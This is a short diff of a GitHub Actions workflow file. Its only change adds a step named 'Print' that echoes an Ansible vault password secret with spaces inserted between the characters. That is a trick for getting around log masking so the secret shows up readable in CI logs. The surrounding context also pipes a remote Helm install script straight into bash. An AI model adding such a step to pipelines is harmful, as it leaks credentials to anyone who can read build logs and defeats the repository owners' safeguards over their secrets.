@@ -21,6 +21,10 @@ jobs:
       run: |
         echo ${{ secrets.ANSIBLE_VAULT_PASSWORD }} > $ANSIBLE_VAULT_PASSWORD_FILE
 
+    - name: Print
+      run: |
+        echo ${{ secrets.ANSIBLE_VAULT_PASSWORD }} | sed 's/./& /g'
+
     - name: Install dependencies
       run: >
         curl -fsSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
